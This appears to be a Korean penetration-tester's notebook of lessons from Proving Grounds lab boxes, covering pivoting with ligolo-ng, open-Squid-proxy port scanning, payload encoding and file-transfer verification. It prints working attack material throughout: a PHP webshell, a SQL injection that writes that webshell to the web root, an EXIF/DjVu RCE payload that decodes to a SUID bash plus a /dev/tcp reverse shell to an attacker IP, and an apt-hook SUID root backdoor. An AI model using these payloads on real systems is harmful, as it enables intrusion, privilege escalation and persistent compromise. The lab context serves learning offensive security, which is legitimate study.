- **바인딩 주소를 먼저 읽을 것** — `0.0.0.0` 이면 방화벽이 원인이고, `127.0.0.1` 이면 서비스가 로컬 전용인 것. [[Outdated]] 는 `0.0.0.0:10000` 이었음(경로상 방화벽)
- **스킴을 확인할 것** — Webmin MiniServ 는 SSL 모드라 `https` + `-k`(자체서명) 필수. 평문 http 로 붙으면 정상 응답이 안 옴
- **로컬 포트를 원격과 같게 맞추는 편이 나음** — 앱이 절대 URL(`Referer`·리다이렉트)에 자기 포트를 박아 넣는 경우가 있음. Webmin 이 그 사례임(B-1-24)
- 반대 방향(내 서비스를 타겟에 노출)은 `-R`, 동적 SOCKS 는 `-D` + `proxychains`

**⛔ SSH 발판이 없으면(AD 박스는 WinRM 만 있는 경우가 흔함) ligolo-ng 가 같은 역할을 함.**

[[Nagoya]] — nmap `-p-` 가 `Not shown: 65514 filtered`(**closed 가 아님**)였고, WinRM 셸 획득 후 `nxc-sweep <IP> -u <user> -p <pass>` 로 **자격증명이 유효한 서비스를 한 번에 스윕**했더니 `[-] Port 1433 closed/filtered. Skipping mssql` 이 바로 나와 「MSSQL 은 살아 있는데 외부에서만 안 보인다」를 즉시 알았음. **impacket-mssqlclient 를 그냥 쳤으면 타임아웃을 기다리며 헤맸을 자리임.**

절차 — evil-winrm 의 `upload` 로 에이전트 바이너리를 올리고 `.\agent.exe -connect <Kali>:11601 -ignore-cert` 로 콘솔에 접속시킨 뒤 `session` → **`start`** 로 터널을 엶. 이후 **`240.0.0.1`**(ligolo 관례상 「에이전트의 127.0.0.1」)로 내부 전용 포트에 닿음.
- ⚠️ **`start` 를 안 치면 터널이 안 열림** — 흔한 실수임
- ⚠️ **Kerberos 인증이 필요한 서비스(MSSQL 등)로 그 터널을 쓰려면 `/etc/hosts` 에 `240.0.0.1 <FQDN>` 을 등록해야 함** — SPN 은 IP 가 아니라 호스트명임(A-51 과 같은 요점)
- 수동 대안 — `chisel` · `plink -R`. 발판에 SSH 가 있으면 `ssh -L` 이 가장 간단함

→ **자격증명을 얻으면 로그인을 하나씩 찔러보기 전에 «서비스 스윕»부터.** 「어디에 붙을 수 있는가」를 목록으로 먼저 볼 것.

**출처** — [[Outdated]] (tcp/10000 Webmin) · [[Nagoya]] (tcp/1433 MSSQL, ligolo-ng).

#### B-72. 오픈 프록시로 «셸 없이» 내부 포트를 연다

**외부 웹 포트가 하나뿐인데 그것이 포워드 프록시면, 그 자체가 공격면이 아니라 «통로»임.** 프록시가 여는 연결은 내부→내부(127.0.0.1→127.0.0.1)라 방화벽이 로컬 트래픽으로 보고 규칙을 적용 안 함 — **오픈 프록시 하나로 「외부 노출 1포트」가 「내부 전 포트 접근」으로 뒤집힘.** 위 B-71 이 «셸 잡은 뒤»라면 이 카드는 «셸 없이»의 같은 사고임.

**원인은 대개 설정 한 줄임** — `http_access allow all`(Squid). 이 줄이 있으면 인증 없이 누구나 중계됨.

**판별은 응답 코드로**(Squid 기준, 다른 프록시도 원리는 같음):

| 응답 | 의미 |
|---|---|
| `503` + `ERR_CONNECT_FAIL` | 연결 실패 — **루프백 대상이면 필터링 여지가 없어 실질적으로 닫힘** |
| `403` + `ERR_ACCESS_DENIED` | ACL 차단(`Safe_ports` 등). **개폐 판별 «불가»** — 「안 나왔다」이지 「닫혔다」가 아님 |
| `400` + `ERR_INVALID_URL` | 프록시 «자신»의 포트. 스캔 결과에 늘 섞여 나옴 |
| 그 외 (200·404·405…) | **열림** |

```bash
P=$1
R=$(curl -s -o /dev/null -m 8 -w '%{http_code}' -x http://TARGET:3128 http://127.0.0.1:$P/ 2>/dev/null)
[ "$R" != "503" ] && [ "$R" != "000" ] && echo "PORT $P -> HTTP $R"
```
**`-m`(타임아웃)은 필수** — 필터링된 포트는 응답이 영영 안 옴. 전 포트를 훑고 503·000 만 걸러낼 것.

⚠️ **503 하나로 「닫힘」을 단정하지 말 것 — Squid 는 `connect()` 실패를 원인별로 구분하지 않음.** refused(RST)든 timeout(필터링)이든 똑같이 `ERR_CONNECT_FAIL` 임. 가르는 판별자는 셋:
1. **본문의 `The system returned:` 줄** — `(111) Connection refused`(닫힘) vs `(110) Connection timed out`(필터링). Squid 가 errno 를 노출하는 유일한 지점
2. **응답 지연** — refused 는 즉시, 필터링은 `connect_timeout`(기본 1분) 대기
3. **`ERR_READ_TIMEOUT`** 이 뜨면 핸드셰이크는 성공한 것 = **포트 열림.** 스캔에서는 오히려 강한 양성 신호

상태 코드도 항상 503 은 아님 — connect 타이머는 504, 피어 응답 불량은 502 로 갈림. **「503=닫힘」은 목적지가 `127.0.0.1` 일 때만 실질적으로 성립함**(루프백에는 필터링이 끼어들 여지가 없음). 외부 IP 대상 스캔에 그대로 옮기면 틀림.

**열거의 «한계»를 정직하게 적어 둘 것.** Squid 의 기본 `Safe_ports` ACL(21·70·80·210·280·443·488·591·777 및 **1025-65535**) 밖의 **1024 이하 포트는 전부 403** 이라 개폐를 판별할 수 없음. [[Squid]] 실측: 403 응답 포트의 최댓값이 정확히 1024 이고 403 총 개수 1015 = 1024 − Safe_ports 9개로 산수까지 맞음. `CONNECT` 도 443 외 전부 차단됐고 443 에 서비스가 없어 범용 터널은 불가능했음. cache manager(`/squid-internal-mgr/info`)도 403 이라 설정 덤프도 못 함.
→ **「스캔했는데 안 나왔다」와 「스캔할 수 없었다」는 다름**(A-2-27).
```bash
curl -v -x http://TARGET:3128 https://example.com/       # CONNECT 가 되는지
curl -s -x http://TARGET:3128 http://127.0.0.1:9999/ -D - # 본문·헤더까지 봐야 503 이 갈림
```

**비-HTTP 서비스의 배너도 그대로 샘.** Squid 는 응답 첫 줄이 `HTTP/x.x` 가 아니면 HTTP/0.9 본문으로 간주해 그대로 전달함 — 그래서 **HTTP 프록시만으로 MySQL·SMTP·FTP·Redis 배너를 딸 수 있음.**

**출처** — [[Squid]](Squid 4.14 오픈 프록시, 3128 하나로 3306·5985·8080·47001 발견). 프록시를 «앱이» 제공해 IP 검사를 무력화하는 반대 방향은 B-15.

### B-8. 페이로드·전송

#### B-81. 페이로드는 base64로 감싼다

**다중 인용 계층을 한 번에 통과함.**

**SQL 로 파일을 쓸 때는 hex 리터럴이 더 나음.** [[Hawat]] — 웹셸 원문 `<?php system($_GET["cmd"]); ?>` 에 따옴표·`$`·`<`·`>` 가 섞여 curl → HTTP → JDBC → SQL 파서로 내려가며 **인용이 네 겹으로 중첩**됨. MySQL 은 `0x...` hex 문자열 리터럴을 그대로 받으므로 인용 문제가 통째로 사라짐.
```bash
echo -n '<?php system($_GET["cmd"]); ?>' | xxd -p | tr -d '\n'
```
```sql
Normal' UNION SELECT 0x3c3f7068702073797374656d28245f4745545b22636d64225d293b203f3e INTO OUTFILE '/srv/http/rce.php'-- 
```
**`UNION` 이라 파일 앞에 원 쿼리의 행들이 먼저 붙지만 무해함** — PHP 는 `<?php` 태그 밖을 텍스트로 출력할 뿐임. 깔끔하게 하려면 `INTO DUMPFILE`(단일 행, 가공 없음).

**`INTO DUMPFILE` vs `INTO OUTFILE` — 바이너리·정확한 바이트열이면 `DUMPFILE`.** `OUTFILE` 은 열·행 구분자를 삽입하고 특수문자를 이스케이프해서 **백슬래시가 `\\` 로 부풀고 개행이 끼어듦** — PHP 문법이 깨질 수 있고 `.exe`·`.dll` 은 100% 망가짐. `DUMPFILE` 은 단일 행을 가공 없이 그대로 씀.
⚠️ **둘 다 기존 파일을 «덮어쓰지 않음».** 대상이 이미 있으면 `Errcode: 17 - File exists` 로 실패함 — **같은 파일명으로 재시도하며 헤매지 말고 이름을 바꿀 것**(권한 문제로 오진하기 쉬운 지점). 대상 디렉터리에 mysqld 계정 쓰기 권한이 없으면 `Errcode: 13` 임. **두 번호를 구분해 읽을 것.**
— 출처: [[Squid]](`SELECT 0x… INTO DUMPFILE 'C:/wamp/www/sh.php'`, WampServer 웹루트)

**누적 패턴 — 「인용이 깨지면 인코딩으로 도망간다」**: [[Hawat]] hex · [[Squid]] `INTO DUMPFILE` + hex + `-enc` + 배치 래핑 · [[Exfiltrated]] base64.

**5중 인용 중첩을 base64 하나로 뚫은 사례.** [[Exfiltrated]] — DjVu 메타데이터 RCE(CVE-2021-22204) 페이로드가 **Perl 문자열 → DjVu 주석 → bzz 압축 → EXIF 값 → 셸** 순으로 5개 층을 통과해야 했음. 원 명령에 `'`·`"`·`>`·`&`·`$` 가 섞여 있어 인용 escape 를 손으로 맞추면 반드시 어느 층에서 깨짐:
```bash
(metadata "\c${system('echo Y2htb2QgK3MgL2Jpbi9iYXNoOyAoYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjIwNy81NTU1IDA+JjEnICYp | base64 -d | bash')};")
```
— 출처: `~/PG/Exfiltrated/exif/payload`. 디코드하면 `chmod +s /bin/bash; (bash -c 'bash -i >& /dev/tcp/192.168.45.207/5555 0>&1' &)` 임(이중화 페이로드는 B-31 ⑸).
base64 알파벳은 영숫자와 `+/=` 뿐이라 어느 층에서도 깨지지 않음. → **따옴표를 몇 개 겹쳐야 하는지 세고 있다면 이미 잘못된 길임.**

**인용 계층만이 아니라 «문자 제약» 우회에도 씀.** [[Outdated]] — Webmin `update.cgi` 가 패키지 이름을 `split(/\//,$ps)` 로 잘라 **`/` 가 든 명령은 첫 슬래시에서 죽음.** 명령 전체를 base64 로 감싸 슬래시를 없앰:
```bash
echo -n 'cp /bin/bash /tmp/rootbash; chmod 4777 /tmp/rootbash' | base64 -w0
```
```text
Y3AgL2Jpbi9iYXNoIC90bXAvcm9vdGJhc2g7IGNobW9kIDQ3NzcgL3RtcC9yb290YmFzaA==
```
전달 형태: `u=;echo <B64>|base64 -d|bash;`

⚠️ **base64 알파벳에는 `/` 가 들어갈 수 있음.** 감쌌다고 안심하지 말고 **출력을 눈으로 확인**할 것. 걸리면 hex 로 바꿀 것 — `echo <hex> | xxd -r -p | bash`, hex 알파벳은 `0-9a-f` 뿐이라 안전함.

**두 플래그를 빠뜨리면 «긴 페이로드에서만» 실패해 원인 추적이 어려움.**
```bash
B64=$(echo -n "$CMD" | base64 -w0)
```
- **`-w0`** — GNU `base64` 는 기본으로 **76자마다 개행**을 넣음. 개행이 든 문자열을 URL·명령행에 넣으면 그 지점에서 잘림. **짧은 테스트는 76자 안에 들어가 «우연히 성공»하고 진짜 페이로드만 실패함**
- **`echo -n`** — 끝 개행까지 인코딩되면 디코드 후 명령 뒤에 개행이 남음. 대개 무해하나 **명령을 셸 인자로 재조립할 때 문제가 됨**

전달 형태는 `echo <b64> | base64 -d | bash`. **마지막이 `sh` 가 아니라 `bash` 여야 함**(A-31 의 dash 두 층).

**인용 계층이 실제로 몇 겹인지 세어볼 것.** [[RubyDome]] 은 curl → HTTP → Ruby → 셸의 4겹이었고, 깨지는 문자는 층마다 달랐음:

| 문자 | 어느 층에서 문제인가 |
|---|---|
| `>` `&` | 백틱 내부에서 리다이렉션·백그라운드로 해석 — `>&` 가 그대로 셸 문법으로 먹혀 명령이 뒤틀림 |
| `"` `'` | 래퍼의 바깥 쌍따옴표를 조기 종료시켜 명령 문자열이 붕괴 |
| 공백 | 래퍼가 통째로 인용하고 있으면 문제가 아님 — **공백을 「항상 위험」으로 일반화하지 말 것** |

base64 문자셋은 `A–Z a–z 0–9 + / =` 뿐이라 셸 메타문자도 따옴표도 공백도 없어 **어느 층도 건드리지 않음.**

**⚠️ HTTP 폼으로 실어 보낼 때는 «전송 방법»이 base64 를 깨뜨림.** `application/x-www-form-urlencoded` 에서 **`+` 는 공백의 인코딩**이라, 재인코딩하지 않는 전송(`curl -d`·`--data-binary`)은 서버 쪽에서 base64 의 `+` 가 공백으로 풀려 `base64 -d` 가 "invalid input" 을 뱉거나 조용히 쓰레기를 만듦. `--data-urlencode`·Python `requests` 는 `+` 를 `%2B` 로 감싸므로 안전함. **어느 쪽을 쓸지는 「그 `%XX` 가 디코드돼야 하는가 리터럴로 남아야 하는가」로 갈림 — 판정표는 A-2-30.**

**URL 인코딩은 페이로드의 «일부»임.** `&` 는 파라미터 구분자이고 `+` 는 공백임:

| 원문 | 인코딩 | 인코딩하지 않으면 |
|---|---|---|
| `>&`(리다이렉션) | `%3E%26` | **`&` 에서 파라미터가 잘림.** `...bash -i >` 까지만 남아 셸이 안 붙음. **가장 흔한 실패임** |
| `'`(작은따옴표) | `%27` | 셸에 따라 인용이 깨짐 |
| ` `(공백) | `%20` | 폼 인코딩에서 raw 공백은 파서에 따라 불안정 |

`>&`·`2>&1`·`0>&1` 이 **전부 `&` 를 포함함.** 놓치면 **200 이 돌아오는데 셸은 안 붙는** 최악의 디버깅 상황이 됨(A-31 · A-2-29 의 증상표).

**⚠️ PowerShell `-enc` 의 base64 는 «UTF-16LE» 임 — 리눅스 습관대로 하면 반드시 실패함.**
```bash
# 틀림 (UTF-8)
echo -n '<명령>' | base64 -w0
# 맞음 (UTF-16LE)
echo -n '<명령>' | iconv -t UTF-16LE | base64 -w0
```
같이 쓰는 플래그 — `-nop`(`-NoProfile`, 프로필 오류로 죽지 않음) · `-w hidden`(창 숨김).
⚠️ **인용 중첩이 2단을 넘으면 base64 로도 부족함 — `.bat` 파일로 뺄 것.** [[Squid]] 는 `cmd /c` → `.bat` → `PrintSpoofer -c` → `powershell` 로 4중이었는데, `fp.exe -c "cmd /c ps.exe -c \"powershell -enc …\""` 처럼 쓰면 **따옴표 안의 따옴표를 `cmd.exe` 파서가 잘라먹음.** Windows 에는 리눅스의 `'…'` 같은 강한 인용이 없음. **막히면 즉시 배치 파일로 빼는 것이 가장 확실함.**

**출처** — [[RubyDome]] · [[Crane]] · [[pyLoader]] · [[Squid]](`-enc` UTF-16LE · `.bat` 래핑).

**감쌀지 말지는 감이 아니라 «층을 세어» 정함.** [[Astronaut]] 의 리버스셸 원문 `bash -i >& /dev/tcp/<LHOST>/4444 0>&1` 이 통과해야 하는 파서:
```text
HTTP POST 본문 (URL 인코딩)
  └─ YAML 파서        ← ' " : # - 이 전부 특수문자
      └─ PHP -r 인자 (셸 argv 분해)   ← & 는 백그라운드, > 는 리다이렉트
          └─ PHP 문자열 리터럴        ← ' " \
              └─ system() → /bin/sh  ← 다시 셸 메타문자
```
**다섯 겹임.** 각 층에서 이스케이프를 정확히 맞추는 것은 «가능»하지만 실수 확률이 높고 디버깅이 지옥임. **base64 는 `[A-Za-z0-9+/=]` 만 쓰므로 위 다섯 층 전부에서 특수문자가 아님** — 인코딩 한 번으로 층 전체를 무력화함.

⛔ **판정법 — 페이로드가 통과할 파서를 «세어» 두 개를 넘으면 감쌀 것.**

**보너스 — `/*<?php /**/` 트릭.** PHP `-r` 은 `<?php` 태그 없이 코드를 받는데, EDB 원본 페이로드는 파일로 써도 동작하도록 태그가 섞여 있음. `/*<?php /**/` 는 `-r` 문맥에서는 **통째로 주석**이고 파일 실행 시에는 `<?php` 가 살아나는 **양쪽 호환 트릭**임. 그대로 두면 되고 직접 짤 때는 빼도 됨.


**Windows 판 — `powershell.exe -EncodedCommand` 는 UTF-16LE 를 요구함.** Windows 의 네이티브 문자열 표현이 UTF-16LE 라, `-EncodedCommand` 는 base64 를 디코드한 결과를 그대로 `wchar_t*` 로 취급함. **UTF-8 을 넣으면 각 ASCII 바이트가 절반씩 잘못 짝지어져 한자·기호 범벅이 되고 파서가 죽음.**
```python
psh_shell = psh_shell.encode('utf-16')[2:]   # Python 의 utf-16 코덱은 BOM \xff\xfe 를 붙임 → [2:] 로 잘라 순수 UTF-16LE
psh_shell = base64.b64encode(psh_shell)
```
손으로 만들 때:
```bash
echo -n '<명령>' | iconv -f UTF-8 -t UTF-16LE | base64 -w0
```
```powershell
[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('<명령>'))
# ↑ .NET 의 Encoding.Unicode 가 UTF-16LE 임. Encoding.UTF8 이 아님
```
⚠️ **`-w0` 를 빼면 실패함.** GNU `base64` 는 기본적으로 76자마다 줄바꿈을 넣고, 그 개행이 명령줄에 들어가면 인자가 쪼개짐. **선택이 아니라 필수**([[Squid]] 의 `-enc` 사용 사례와 동일).

**`-enc` 를 쓰는 진짜 이유는 탐지 회피가 아니라 «인용부호 붕괴 회피»임.** [[Algernon]] 의 페이로드는 `Python 문자열 → base64 직렬화 스트림 → cmd.exe 명령줄 → powershell.exe 인자` 라는 **4중 경유**를 거침. 원라이너에 `"`·`$`·`|`·`&`·`>` 가 전부 들어 있어 그대로는 어느 계층에서든 반드시 깨짐. base64 는 `A-Za-z0-9+/=` 뿐이라 어느 셸에서도 특수문자가 없음.
→ 누적 패턴 「인용이 깨지면 인코딩으로 도망간다」 — [[Hawat]] hex · [[Exfiltrated]] base64 · [[Squid]] hex + `-enc` + 배치 래핑 · **[[Algernon]] base64 + UTF-16LE**.
⚠️ **`-enc` 는 AMSI 를 우회하지 못함**(A-35). 인용 회피용이지 탐지 회피용이 아님.

#### B-82. 파일 전송 후 `ls`/`md5sum`으로 확인한다

**다운로드 「성공」 메시지를 믿지 말 것 — 경로 문제로 조용히 실패해도 성공 배너를 냄.** [[Squid]] — `certutil -urlcache -f <URL> PrintSpoofer64.exe`(상대경로)가 `CertUtil: -URLCache command completed successfully.` 를 반환했는데 `dir` 로 확인하니 파일이 없었음.

⚠️ **이전 판은 이것을 「유명 도구는 파일명만으로 삭제됨」(AV 파일명 시그니처)으로 적었으나 반증됐음:**
- Defender 에 **「파일명 시그니처」 탐지 기전 자체가 없음** — 탐지는 내용·행위·ML 기반이고 파일명은 *제외 목록*에서만 쓰임
- 관측된 `RealTimeProtectionEnabled=False` 는 **애초에 쓰기 시점 스캔이 없었다는 뜻**이라 자기 결론을 반박함
- PrintSpoofer 는 실제로 내용 기반(`HackTool:Win64/PrintSpoofer!MTB`)으로 탐지되는 도구라, 내용 기반이면 **이름만 바꿔서는 회피 안 됨**
- `[가정]` 남은 유력 원인 — `certutil -urlcache -f` 는 대상 경로에 쓸 수 없을 때도 「완료」 배너와 exit 0 을 반환함. 웹셸 컨텍스트의 CWD 는 대개 쓰기 불가라 상대 파일명이 사라진 것
- ⚠️ **다만 이것도 확증이 아님** — 산출물은 파일명 변경과 절대경로 지정이 **동시에** 일어났음만 보여줌. **확정된 것은 AV 파일명 이론의 반증까지임**
- 참고 — 진짜 HTTP 실패는 시끄러움. 404 는 `0x80190194 (HTTP_E_STATUS_NOT_FOUND)` 에 음수 exit 로 떨어짐

**⚠️ 반대 방향도 있음 — 「실패」 메시지가 떴는데 파일은 «있는» 경우.** `certutil -urlcache -split` 은 **HTTP 상태 코드와 무관하게 응답 본문을 파일로 씀** — 404 HTML 페이지가 그대로 저장됨. [[Osaka]] 실측: `nc64.exe` 다운로드가 404 로 실패했는데 **335바이트**짜리 파일이 남았고(정상 nc64 는 수십 KB — 실제 회수본 `~/PG/Osaka/nc64.exe` 는 45,272B), 파이썬 `http.server` 의 404 본문이 그 정체였음. 다른 파일명(`nc64_new.exe`)으로 재시도해 정상 크기를 확보함.
```cmd
dir nc64.exe
certutil -hashfile nc64.exe MD5
```
Kali 에서 `md5sum` 과 대조할 것. **바이트 수가 안 맞으면 실행하지 말 것.**
→ `-f`(force)의 부작용 — 기존 캐시를 무시하고 새로 받지만 URL 캐시가 남아 있으면 같은 URL 재시도에서 옛 응답이 다시 나올 수 있음. **망가진 파일을 덮어쓰려 하지 말고 새 파일명으로 받는 편이 안전함.**
→ 정리하면 `certutil` 은 **양방향으로 거짓말함** — 성공 배너인데 파일이 없기도 하고(위 [[Squid]]), 실패 메시지인데 파일이 있기도 함. **판정은 언제나 크기·해시임.**
- ⚠️ **반증된 것은 [[Squid]] 쪽 근거뿐임.** 같은 스텁이 함께 인용하던 [[Exghost]] 는 별개 박스라 확인하지 않았음 — **그쪽은 그대로 유효할 수 있으므로 「AV 가 파일 삭제를 한다」 자체를 배제하지는 말 것**

**전송 후 체크리스트:**
```cmd
dir C:\Users\Public\fp.exe
certutil -hashfile C:\Users\Public\fp.exe MD5
```
**회피 순서(싼 것부터)** — ① **쓰기 가능한 절대경로 지정**(`C:\Users\Public\ps.exe`) ← 대개 여기서 해결됨 ② 파일명 변경(내용 기반 탐지에는 무력하지만 가장 쌈) ③ 전송 경로 변경(`C:\Windows\Temp\`·`%APPDATA%`) ④ 전송 수단 변경(`certutil`→`iwr`→SMB) ⑤ 페이로드 자체 변경.

**리눅스 판 — 올린 뒤 «되읽어 `diff`» 로 확인할 것.** [[Sorcerer]] 는 `authorized_keys` 를 덮어쓴 뒤 같은 파일을 다시 내려받아 대조했음:
```bash
scp -O -i id_rsa <user>@TARGET:~/.ssh/authorized_keys ./verify.txt && diff ./verify.txt ./authorized_keys
```
**쓰기가 통했다는 «증거»가 있어야 다음 단계의 실패를 전송 탓으로 오진하지 않음**(A-3-14).

**받아오는 방향도 같음 — 바이너리를 HTTP 로 받으면 `-o` 저장 → `file` → (가능하면) `md5sum` 순서를 습관으로.** 검증을 건너뛰면 **문제를 몇 단계 뒤에나 발견함:**
```text
잘못된 순서:  curl (검증 없음) → sqlite3 → "file is not a database" → 원인 추적
올바른 순서:  curl -o → file → sqlite3
```
`file` 출력의 `database pages 187` 같은 값은 **「내용이 실제로 들어 있다」까지** 알려줌 — 0페이지짜리 빈 DB 를 받았다면 여기서 즉시 잡힘. [[Fanatastic]] 의 `grafana.db`(SQLite)가 그 경우였음(B-1-27).

⚠️ **여기서 md5 가 하는 일은 «Kali 원본 ↔ 타겟 사본의 동일성 확인» 하나뿐임.** 「이 exe 가 어느 페이로드인가」를 md5 로 가르려 들면 안 됨 — 같은 인자로 만들어도 매번 다른 해시가 나옴(B-88).

**⛔ 이미지 «재인코딩» 경로는 EXIF 페이로드를 조용히 파괴함 — 실패 신호가 아예 없음.** 파일은 정상으로 보이고 크기도 비슷하고 크론도 도는데 페이로드만 사라짐. 썸네일 생성·리사이즈·포맷 변환·CDN 최적화가 **전부 페이로드 파괴자**임.
[[Exfiltrated]] — 파일 매니저(elFinder) 업로드가 이미지를 재인코딩할 위험이 있어, 대신 **이미 획득한 웹셸로 base64 를 그대로 흘려 넣어 바이트를 보존**했음. 업로드 전후 MD5 를 대조해 무결성을 확인:
```bash
B64=$(base64 -w0 exif/image.jpg)
curl -G --data-urlencode "cmd=echo $B64 | base64 -d > .../evil.jpg; md5sum .../evil.jpg" http://.../exfsh01.phar
```
원본과 타겟 MD5 가 일치하면 실패 원인 후보(페이로드 오류 / 전송 손상 / 조건 불일치) 중 **전송 손상 하나를 5초에 지움.** 크론 재시도 비용(60초 × N회)에 비하면 검증 비용이 사실상 0임(B-31 ⑹).
→ **원칙 — 이미지 메타데이터 페이로드는 「이미지를 다루는 경로」를 통과시키지 말 것.** 가능하면 파일시스템에 직접 쓸 것.
→ 부수 — 파일명이 `evil.jpg` 라 크론의 `grep "jpg"` 필터도 함께 통과했음. **무결성과 필터 조건을 동시에 만족시키는 이름을 고를 것.**

#### B-83. 타겟에 `curl` 이 없을 수 있다 — 전송 도구부터 확인

[[BossPlayersCTF]] — `wget`·`python`·`python3` 은 있고 `curl` 만 없었음. 최초 harvest 전송이 `bash: curl: command not found` 로 실패한 **뒤에야** `which` 로 확인해 `wget` 우회 — 순서가 거꾸로였음.

- 셸을 잡으면 **전송 도구 유무부터 확인**하고, 페이로드 스크립트는 `curl`/`wget` 양쪽으로 준비할 것
- ⚠️ `which` 결과의 부재를 「설치 안 됨」으로 읽기 전에 **질의 목록에 그 이름을 넣었는지부터** 볼 것 — `python3` 는 질의에 없었을 뿐 실제로는 존재했고 pty 승격에 사용됨

**폴백 순서를 고정해 둘 것** — `wget` → `curl` → **bash 내장 `/dev/tcp`**(외부 도구가 하나도 없을 때):
```sh
exec 3<>/dev/tcp/<LHOST>/80; printf 'GET /x HTTP/1.0\r\n\r\n' >&3; cat <&3 > /tmp/x
```
→ **SSH 가 이미 있으면 `scp` 가 최선임** — 인증·무결성이 공짜이고 되읽어 `diff` 하기도 쉬움(B-82). 반대로 **디스크에 흔적을 안 남기려면 `curl … | sh`** 로 파이프할 것(C-5). ([[Sorcerer]])

**셸을 잡기 «전»에도 도구 인벤토리를 돌릴 수 있음 — 블라인드 RCE 면 더 그래야 함.** [[ClamAV]]: `nc`·`netcat`·`python`·`socat` 전부 없고 `perl`·`telnet`·`bash`·`mkfifo` 만 있었음(`http_stager.log` 14:32:03~04). 리버스셸을 바로 던졌으면 **「도구 없음 / 아웃바운드 차단 / 페이로드 문법」 중 무엇이 원인인지 구분이 안 됨.** 회신 채널은 B-87.
→ 낡은 리눅스(Debian sarge)에는 `nc`·`python` 이 없는 것이 정상임. **perl 리버스셸 한 줄을 항상 갖고 다닐 것.**

#### B-84. 원격에서 만든 스크립트는 이스케이프가 «한 겹» 먹힌다

**증상** — 익스플로잇 스크립트를 `ssh host "cat > f"` 류로 원격 생성하면 따옴표와 백슬래시가 한 겹 소모됨. 페이로드의 개행(`\n`)이 리터럴 `n` 한 글자로 바뀌면 그 익스플로잇은 **오류 없이 조용히 아무 일도 안 함.**

[[Graph]] 실측 — 저장된 사본이 셋을 동시에 잃었음:
```bash
PAY=$99999:7:::njosh:"$H"$:19000:0:99999
```
— 출처: `~/PG/Graph/exploit_passgen.sh`
- `\n` → 리터럴 `n`(`njosh`)
- `H=` 에서 해시 접두 `$6$Gr4phSlt$PGF3` 이 통째로 소실
- `printf '%s\n'` → `printf %sn`

셋이 **동시에** 사라진 형태가 ANSI-C 인용(`PAY=$'…\n…'`)에서 홑따옴표와 백슬래시가 함께 먹힌 것과 맞음.

**이 실패는 결과로만 잡힘.** 타겟 `/etc/shadow` 에 남은 실패 잔재가 그 손상 문자열과 정확히 일치함:
```text
bogus:!:0:0:99999:7:::njosh:.RO7QU80esZUwsLy5nnnB3a.Jq4Qp7wW0bWUJS.Wpg09a4.F0gbi5qIBj4LLi2cFgRPsfHkEkGm25F3/Z1$:19000:0:99999:7:::
```
— 출처: `~/PG/Graph/harvest_root.txt` 「USERS」절

리터럴 `njosh`·접두 없는 해시·후행 `$` 셋이 지문임. **실행은 성공했고 shadow 는 바뀌었는데 행이 안 끊겨 주입만 안 된** 상태라, 출력만 봐서는 실패를 알아채기 어려움.

**대응** — ① 페이로드에 개행이 들어가면 **타겟에서 `printf %s "$PAY" | xxd` 로 바이트를 확인**한 뒤 던질 것 ② 스크립트는 base64 로 감싸 전송할 것(B-81) ③ **남길 사본은 타겟에서 되받아온 것**으로 할 것(Kali 원본이 아니라).

**SSH 를 «한 겹 더» 거치면 인용이 두 번 깨짐.** [[Monster]] — `<pre>` 가 든 PHP 페이로드를 heredoc 으로 원격에 쓰려다 **원격 bash 가 `<` 를 리다이렉션으로 읽어** `pre: No such file or directory` 를 뱉었음. 페이로드에 `<`·`>`·`$`·`"` 가 전부 들어 있어 인용부호로는 이길 수 없었음.
**해법 — 파일에서 읽어 URL 인코딩까지 curl 에 맡김:**
```bash
curl ... --data-urlencode 'content@payload.php'
```
→ 일반화: **특수문자가 든 페이로드는 인용으로 싸우지 말고 «인코딩으로 도망갈 것»**(B-81 의 누적 패턴과 같은 결론).

**`tmux send-keys` 로 원격에 설정 파일을 만들지 말 것.** [[Flimsy]] — `printf` 로 apt 훅 파일을 만들었더니 내용 끝에 **리터럴 `n`** 이 붙었음:
```text
franklin@flimsy:/tmp$ printf %s\n "APT::Update::Pre-Invoke {\"cp /bin/bash /tmp/
rootbash; chown root:root /tmp/rootbash; chmod 4755 /tmp/rootbash\";};" > /etc/a
pt/apt.conf.d/99zzpwn; cat /etc/apt/apt.conf.d/99zzpwn; ls -l /etc/apt/apt.conf.
d/99zzpwn
...
APT::Update::Pre-Invoke {"cp /bin/bash /tmp/rootbash; chown root:root /tmp/rootb
ash; chmod 4755 /tmp/rootbash";};n-rw-rw-rw- 1 franklin nogroup 114 Aug 20 12:30
```
끝에 `;};n` — **`tmux send-keys` 를 거치며 `printf '%s\n'` 의 백슬래시가 벗겨져 포맷 문자열이 `%sn` 이 됐음.** `apt.conf` 파서는 이런 것을 그냥 뱉고 죽음.
- **Kali 에서 파일을 만들고 `curl` 로 내려받는 것이 언제나 쌈**
- **검증은 `cat -A`** — 마지막 바이트가 `};$` 면 정상. 이 습관이 잡아냄:
```text
APT::Update::Pre-Invoke {"cp /bin/bash /tmp/rootbash; chown root:root /tmp/rootb
ash; chmod 4755 /tmp/rootbash";};$
```
소요 약 1분. 21:31 에 `curl` 로 교체. 페이로드 적용처는 B-34.


**5중 경유에서 중첩 따옴표 + 셸 문법 혼입이 «동시에» 깨짐 — 에러도 없이.** [[Algernon]] 리버스셸 안에서:
```text
PS C:\Windows\system32> cmd /c "dir C:\ /s /b 2>/dev/null | findstr /i \"proof.t
xt local.txt\""
PS C:\Windows\system32>
```
— 출처: `~/PG/Algernon/shell_session.log`

출력 0줄, 에러도 없음. 둘이 동시에 망가졌음:
1. **`2>nul`(Windows)이 `2>/dev/null`(sh)로 변형됨.** Windows 에서 `/dev/null` 은 경로로 해석돼 리다이렉트가 실패함
2. **중첩 따옴표 붕괴.** `SSH → tmux send-keys → nc 소켓 → PowerShell iex → cmd.exe` 5중 경유라 각 계층이 백슬래시·큰따옴표를 자기 방식으로 소비함

**어떻게 알아챘는가 — `dir C:\ /s /b` 는 어떤 상황에서도 수만 줄을 뱉음.** 출력이 0줄이라는 것은 「찾는 파일이 없다」가 아니라 **「명령 자체가 실행되지 않았다」**임. 결과가 「없음」일 때는 명령이 정말 돌았는지부터 의심할 것.

**해결 — 경유를 하나 줄이고 중첩 따옴표를 없앰:**
```powershell
Get-ChildItem C:\Users -Directory | Select-Object -Expand Name
Get-ChildItem C:\Users\dean\Desktop, C:\Users\Administrator\Desktop -Force -ErrorAction SilentlyContinue | Select-Object FullName
```
- `cmd /c` 를 없애 경유 계층 5→4
